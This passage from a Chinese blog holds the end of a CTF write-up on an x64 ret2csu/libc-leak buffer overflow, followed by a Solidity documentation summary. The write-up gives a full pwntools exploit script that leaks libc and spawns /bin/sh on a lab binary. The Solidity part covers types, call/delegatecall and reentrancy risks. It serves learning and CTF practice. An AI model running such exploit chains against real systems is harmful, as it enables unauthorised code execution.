<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#activate the system("/bin/sh")</span></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss) + p64(bss+<span class="number">8</span>) + p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span> *<span class="number">56</span> + p64(main)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;最终的exp如下：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r12 = ret_addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r13 = rdi = arg1   r14 = rsi = arg2    r15 = rdx = arg3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rbx = 0    rbp = 1</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop_libc1'</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./rop_libc1'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x401153</span></span><br><span class="line">bss = <span class="number">0x00000008</span></span><br><span class="line">read_got = <span class="number">0x404020</span></span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_got= "</span> + hex(write_got)</span><br><span class="line">write_libc = libc.symbols[<span class="string">'write'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_libc= "</span> + hex(write_libc)</span><br><span class="line">system_libc = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system_libc= "</span> + hex(system_libc)</span><br><span class="line">bin_sh_libc = libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"bin_sh_libc= "</span> + hex(bin_sh_libc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of write</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x88</span>  + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">1</span>) + p64(write_got) + p64(<span class="number">8</span>)</span><br><span class="line">payload1 += p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span> * <span class="number">56</span> + p64(main)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(sh.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"write_addr= "</span> + hex(write_addr)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get the address of system and bin_sh</span></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(read_got) + p64(<span class="number">1</span>) + p64(bss) + p64(<span class="number">16</span>) + p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span>*<span class="number">56</span> + p64(main)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.send(p64(system_libc + write_addr - write_libc))</span><br><span class="line">sh.send(<span class="string">"/bin/sh\0"</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Hello, World\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#activate the system("/bin/sh")</span></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x88</span> + p64(<span class="number">0x4011e2</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss) + p64(bss+<span class="number">8</span>) + p64(<span class="number">0x4011c8</span>) + <span class="string">'d'</span> *<span class="number">56</span> + p64(main)</span><br><span class="line">sh.sendline(payload3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;至此，一个华丽的利用已经完成了.  </p>
<blockquote>
<p>以上是对x64libc泄漏的处理方式</p>
</blockquote>
<h4 id="书山又路勤为径-学海无涯苦做舟"><a href="#书山又路勤为径-学海无涯苦做舟" class="headerlink" title="书山又路勤为径,学海无涯苦做舟"></a>书山又路勤为径,学海无涯苦做舟</h4>
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-03-28</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/03/28/solidity文档整理/">solidity文档整理</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <h3 id="文档整理"><a href="#文档整理" class="headerlink" title="文档整理"></a>文档整理</h3><hr>
<h4 id="1-合约的结构"><a href="#1-合约的结构" class="headerlink" title="1. 合约的结构"></a>1. 合约的结构</h4><ul>
<li>状态变量(State Variable)  </li>
</ul>
<p>&emsp;&emsp;状态变量指的是那些直接声明在函数外的变量，他们被永久的储存在合约里。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleStorage&#123;</span><br><span class="line">    uint storedData;	<span class="comment">//State variable</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数(Function)  </li>
</ul>
<p>&emsp;&emsp;solidity里的函数与Javascript极为相似，但是包含更多的修饰词和可见性限制,也可以有多个返回值。  </p>
<ul>
<li>函数修改器(Function Modifier)  </li>
</ul>
<p>&emsp;&emsp;函数修改器主要是以声明的形式来修改函数的语义，比如给函数的出发增加限制条件或者验证。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract Purchase&#123;</span><br><span class="line">    address public seller;</span><br><span class="line">    </span><br><span class="line">    modifier onlySeller() &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender == seller,<span class="string">"only seller can call this"</span>);</span><br><span class="line">        -;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">abort</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">onlySeller</span></span>&#123;	<span class="comment">// Modidier usage</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>事件(Event)  </li>
</ul>
<p>&emsp;&emsp;事件是<strong>EVM logging</strong>的便利接口。当事件被触发时，可将部分数据记录到区块链上。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction&#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); <span class="comment">//Event</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">bid</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        emit HighestBidIncreased(msg.sender,msg.value); <span class="comment">//Triggering event</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结构(Struct)  </li>
</ul>
<p>&emsp;&emsp;结构体与c语言极为相似  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Ballot&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Voter</span>&#123;</span> <span class="comment">// Struct</span></span><br><span class="line">        uint weight;</span><br><span class="line">        <span class="keyword">bool</span> voted;</span><br><span class="line">        address delegate;</span><br><span class="line">        uint vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>枚举(Enum)  </li>
</ul>
<p>&emsp;&emsp;枚举与C++中的枚举类似，都是自定义类型，你可以认为这是一个常量集合。  </p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    <span class="keyword">enum</span> State &#123;</span><br><span class="line">        Created, Locked, Inactive		<span class="comment">//Enum</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<h4 id="2-数据类型"><a href="#2-数据类型" class="headerlink" title="2. 数据类型"></a>2. 数据类型</h4><ul>
<li>布尔(Booleans)  </li>
</ul>
<p>&emsp;&emsp;与通常的语言一样，<strong>bool</strong> 包含 <strong><em>true</em></strong> 和 <strong><em>false</em></strong> 两种常量。  </p>
<p><strong>Operators</strong>:  </p>
<ol>
<li><strong>!</strong>  非  </li>
<li><strong>&amp;&amp;</strong> 与  </li>
<li><strong>||</strong>  或  </li>
<li><strong>==</strong>  等于  </li>
<li><strong>!=</strong>  不等于  </li>
</ol>
<blockquote>
<p><strong>||</strong> 和 <strong>&amp;&amp;</strong> 遵守短路定律，这意味着表达式  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f(x) || g(y)</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;如果f(x)为真，g(y)将不参与运算，尽管这可能有副作用。  </p>
<ul>
<li>整数(Integers)  </li>
</ul>
<p>&emsp;&emsp;<strong>int</strong> / <strong>uint</strong> 分别是有符号和无符号整数，他们具有可变的内存体积。关键字uint8到uint256与int8到uint8相对应。数字后缀代表的是变量的内存大小，uint8指的是<strong>8bits</strong>的无符号整数。并且uint与int是uint256与int256的别名(alias)。  </p>
<p><strong>Operator</strong>:  </p>
<ol>
<li>比较： <strong>&lt;= , &lt; , == , != , &gt;= , &gt;</strong> (表达式的值为bool)</li>
<li>位运算： &amp; , | , ^ , ~  </li>
<li>移位运算： &lt;&lt; , &gt;&gt;  </li>
<li>算数运算： +  ,  -   ,  *  ,  /  </li>
</ol>
<blockquote>
<p>整数的大小范围在solidity中十分严格，例如uint32代表0到2**32 - 1之间的数，如果结果超出这个范围，那么可能造成上溢或者下溢，这可能会给合约造成严重的安全隐患。  </p>
</blockquote>
<ul>
<li>地址(Address)  </li>
</ul>
<p>&emsp;&emsp;地址类型是较为特殊的变量类型，这中变量对应一个合约或者账户(本质上合约就是一个账户)，他主要包含两种风格：  </p>
<blockquote>
<p>address: 包含20byte的值  （以太坊地址）<br>address payable: 与address一样，但是包含transfer和send两个成员  </p>
</blockquote>
<p>&emsp;&emsp;两者的主要区别是，后者可以就收以太币(Ether)，但是address却不能，这里一定要注意，尤其是在写攻击合约的时候。  </p>
<p>&emsp;&emsp;address payable 到 address的隐式转换是允许的，但是反过来却不行，地址字面量能够被隐式的转换为address payable  </p>
<p>&emsp;&emsp;int 整数字面量(integer literals) bytes20以及合约 类型都可以被被显式的转换为address类型。  </p>
<blockquote>
<p>int 字面量 和bytes20 想要转换为address payable必须满足地址本身代表的合约或者账户的fallback(回滚)函数必须是payable的。当然，如果address变量的fallback函数是payable的，那么显式的转换也是可以的。</p>
</blockquote>
<blockquote>
<p>warning:</p>
<blockquote>
<p>如果你想要将一个大的bytes类型转换为地址，比如bytes32,这个时候address会截尾，为了避免二义性，你必须显式的自行进行截断的选择。</p>
</blockquote>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="number">0x111122223333444455556666777788889999AAAABBBBCCCCDDDDEEEEFFFFCCCC</span>;</span><br><span class="line"></span><br><span class="line">address(uint160(bytes20(b))) 		<span class="comment">//这时结果为0x111122223333444455556666777788889999aAaa</span></span><br><span class="line"></span><br><span class="line">address(uint169(uint256(b)))		<span class="comment">//这时结果为0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc</span></span><br></pre></td></tr></table></figure>
<ul>
<li>地址的成员(Members of Address)  </li>
</ul>
<p>&emsp;&emsp;上面提到balance和transfer是address payable类型的两个成员。  </p>
<p>&emsp;&emsp;如果地址是payable的，那么我们可以查询地址剩余的Ether或者向他打钱，例如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">address payable x = address(<span class="number">0x123</span>);</span><br><span class="line">address myAddress = address(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(x.balance &lt; <span class="number">10</span> &amp;&amp; myAddress.balance &gt;= <span class="number">10</span>)&#123;</span><br><span class="line">	x.transfer(<span class="number">10</span>);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这个时候我们就向x地址打了10块钱，balance实际上是调用了成员对象本身的getter()函数，getter能够返回一个状态变量的值。  </p>
<blockquote>
<p>transfer函数将会在ether不足或者对方拒绝收钱时执行失败，这个时候transfer()将会回滚，注意这里很重要，有转账功能的还有send()函数和<address>.call.value()()函数，后两者在失败时转出的钱不会回滚，这就有可能导致Reentrancy漏洞。  </address></p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">处理</th>
<th style="text-align:left">消耗</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><address>.transfer()</address></td>
<td style="text-align:left">失败时抛出异常，并且回滚状态</td>
<td style="text-align:left">消耗2300 Gas (not adjustable) 可防止回滚</td>
</tr>
<tr>
<td style="text-align:left"><address>.send()</address></td>
<td style="text-align:left">失败时返回错误</td>
<td style="text-align:left">消耗2300 Gas (not adjustable) 不防止回滚</td>
</tr>
<tr>
<td style="text-align:left"><address>.call.value().gas()()</address></td>
<td style="text-align:left">失败时返回错误</td>
<td style="text-align:left">消耗Gas可调节 不防止回滚</td>
</tr>
</tbody>
</table>
<blockquote>
<p><address>.send()与<address>.call.value()()函数在转账过程中发生异常时，不能有效回滚，导致Reentrancy的攻击无法防御，因此我们在交易时应当使用transfer()函数。</address></address></p>
</blockquote>
<blockquote>
<p>关于call()  delegatecall()   staticcall()<br>为了不依赖于ABI来调用合约的接口，或者更为直接的调用其他合约的方法，solidity提供了call，delegatecall，staticcall。他们都接受一个<strong>bytes memory</strong>类型的参数，并且返回bool类型和被调用方法的返回值。方法abi.encode,abi.encodePacked,abi.encodeWithSelector以及abi.encodeWithSignature 可以被用来将数据编码结构化。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bytes memory payload = abi.encodeWithSignature(<span class="string">"register(string)"</span>,<span class="string">"MyName"</span>);</span><br><span class="line"></span><br><span class="line">(bool success, bytes memory returnData) = address(nameReg).call(payload);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(success);</span><br></pre></td></tr></table></figure>
<h4 id="关于call-与delegatecall-的区别："><a href="#关于call-与delegatecall-的区别：" class="headerlink" title="关于call()与delegatecall()的区别："></a>关于call()与delegatecall()的区别：</h4><p>&emsp;&emsp;这里要强调一下call与delegatecall可能导致的问题，两者都是底层调用，但是两者的上下文不同，call所代表的上下文是被调用合约实例本身，而delegatecall则是该方法调用的发起者。</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/eth_writeUp0.png?raw=true" alt="delegatecall">  </p>
<p>&emsp;&emsp;因此这时候我们应当注意状态的转换，尽量少的使用底层调用。  </p>
<blockquote>
<p>注：<br>作为底层调用，如果你调用了任何未知的恶意合约，相当于你将控制权交给了他，这有可能导致该恶意合约回调你的合约，所以你的合约状态变量可能会被恶意修改。通常情况下我们应当创建一个合约实例,如: x.f()</p>
</blockquote>
<p>&emsp;&emsp;call()的用法实例：  </p>
<ol>
<li>通过gas()函数修改器来调整Gas  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.gas(<span class="number">1000000</span>)(abi.encodeWithSignature(<span class="string">"register(string)"</span>, <span class="string">"MyName"</span>));</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>通过value()函数修改器来调整Ether：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.value(<span class="number">1</span> ether)(abi.encodeWithSignature)(<span class="string">"register(string)"</span>,<span class="string">"MyName"</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>这两种函数修改器可以结合：  </li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address(nameReg).call.gas(<span class="number">1000000</span>).value(<span class="number">1</span> ether)(abi.encodeWithSignature(<span class="string">"register(string)"</span>, <span class="string">"MyName"</span>));</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;类似地，函数delegatecall也可以被如此调用，区别是：此函数只使用给定地址的代码，其他方面比如(storage,balance…)都是当前调用合约，这一点上面我们说过了。使用delegatecall的目的主要是使用其他合约的library中的方法。但是用户需要确定两合约的内存布局适合是的。  </p>
<p>&emsp;&emsp;对于staticcall，他与call十分相似，但这个方法会revert(恢复调用前状态)如果被调用方法修改了状态变量。</p>
<blockquote>
<p>delegatecall()不支持value()修改器  </p>
</blockquote>
<blockquote>
<p>所有的合约都能被显式转换为地址，因此可以使用address(this).balance来查看当前合约的存款。  </p>
</blockquote>
<hr>
<ul>
<li>合约类型(Contract)  </li>
</ul>
<p>&emsp;&emsp;与C++类似，每种合约都是一种数据类型，子类合约可以隐式的转换为父类或超类合约，并且能够显式的转换为address类型。  </p>
<p>&emsp;&emsp;与address类似，只有fallback函数是payable的合约才能转化为address payable。转换的方式依旧是<strong>address(contract)</strong> 而不是 <strong>address payable(contract)</strong>.  </p>
<p>&emsp;&emsp;你可以声明一个合约类型的局部变量，那么你就可以调用那个合约的方法，如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract A &#123;</span><br><span class="line">	uint x;</span><br><span class="line">    contrusctor(uint a) internal&#123;</span><br><span class="line">        x = a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B &#123;</span><br><span class="line">    A a = A(<span class="number">2</span>);			<span class="comment">//调用了A的构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echoA</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a.x();		<span class="comment">//返回a.x的值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;但是假如你想要调用已经存在的一个实例，比如想要攻击已经在链上的一个合约，这个时候你可以：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">contract Fuck &#123;</span><br><span class="line">	address target_contract_addr = <span class="string">"0x123"</span>;		<span class="comment">//首先获得攻击目标的地址</span></span><br><span class="line">    </span><br><span class="line">    TargetContract x = TargetContract(target_contract_addr);		<span class="comment">//将地址注入构造函数</span></span><br><span class="line">    </span><br><span class="line">    x.balance();		<span class="comment">//进行你想做的攻击</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>你可以用type(c)来获得c合约的类型。  </p>
</blockquote>
<hr>
<ul>
<li>定长数组(Fixed-size byte arrays)  </li>
</ul>
<p>&emsp;&emsp;bytes1到bytes32能储存一列数，数组长度是从1到32，byte是byte1的alias。  </p>
<p>Operator：  </p>
<ol>
<li>比较 &lt;= , &lt; , == , != , &gt;= , &gt; 结果返回bool  </li>
<li>位运算： &amp; , | , ^ , ~   </li>
<li>移位运算： &lt;&lt; , &gt;&gt;  </li>
<li>寻址运算： x[k] 获得数组x的第i+1个数据  </li>
</ol>
<blockquote>
<p>成员对象.length是只读的，不可修改  </p>
</blockquote>
<ul>
<li>变长数组(Dynamically-sized byte array)  </li>
</ul>
<p>&emsp;&emsp;bytes是动态大小的数组，不是值类型。<br>&emsp;&emsp;string是UTF-8-encode 的string类型，不是值类型。  </p>
<hr>
<ul>
<li>字面量(Literals)  </li>
</ul>
<p>&emsp;&emsp;字面量包括地址字面量(Address Literals)，字符串字面量(String Literals)和有理字面量(Rational Literals)以及整数字面量(Interege Literals),通俗来讲字面量就是常数，而且其精度无限(与其本身长度有关)，但是当字面两转化为非字面量时，精度可能会损失。  </p>
<blockquote>
<p>5/2对于字面量来说是2.5，而对于uint来说是2。字面量参与非字面量进行运算时，其类型必须相同，如:  </p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">uint128 a = <span class="number">1</span>;</span><br><span class="line">uint128 b = <span class="number">2.5</span> + a;		<span class="comment">//这样写是会报错的</span></span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li>函数(Function)  </li>
</ul>
<p>&emsp;&emsp;函数的用法与js极为相似，只是有些可见性关键字需要解释一下，首先来看一下声明格式：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params">&lt;parameter types&gt;</span>) </span>&#123;internal|external&#125; [pure|view|payable] [<span class="xml"><span class="tag">&lt;<span class="name">returns</span> <span class="attr">types</span>&gt;</span>]</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;函数中假如有返回值，则返回值的类型不能省略，如果返回值缺省，那么整个<strong>returns()</strong>的部分都应该省略。  </p>
<p>&emsp;&emsp;默认情况下函数的可见性是internal，但是我自己在尝试时发现，如果可见性关键字缺省则会导致报错。  </p>
<p>&emsp;&emsp;下面我们来解释一下可见性与访问控制的问题：  </p>
<p>&emsp;&emsp;函数的可见性分为四种：<strong>public private internal external</strong> .</p>
<h4 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h4><p>&emsp;&emsp;internal调用，实现时转为简单的EVM跳转，所以他能够直接访问上下文的数据，对于引用传递是十分高效，例如memory之间的值传递，实际上是引用的传递(妈耶，storage和memory又是坑，不同版本真是令人窒息)。  </p>
<p>&emsp;&emsp;当前代码单元内，比如同一个合约内的函数，引入的library库，以及父类函数的直接调用即为internal调用，比如：  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) <span class="title">internal</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在上述代码中的b()对a()的调用即为internal方式调用，函数在不显式声明访问类型时,以目前的版本来看会报错。</p>
<h4 id="external"><a href="#external" class="headerlink" title="external"></a>external</h4><p>&emsp;&emsp;external调用实现了合约的外部消息调用。所以合约在初始化时不能以external的方式调用自身函数，因为此时合约仍未构造完成，此处可类比struct类型，一个结构体不能包含自身对象。但是可以以this的方式强制进行external调用。  </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity &gt;= <span class="number">0.4</span><span class="number">.0</span> &lt; <span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line">contract test&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">a</span>(<span class="params"></span>) <span class="title">external</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        a();  <span class="comment">//此时会报错</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    contract ext&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">callA</span>(<span class="params">test tmp</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">            tmp.a();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
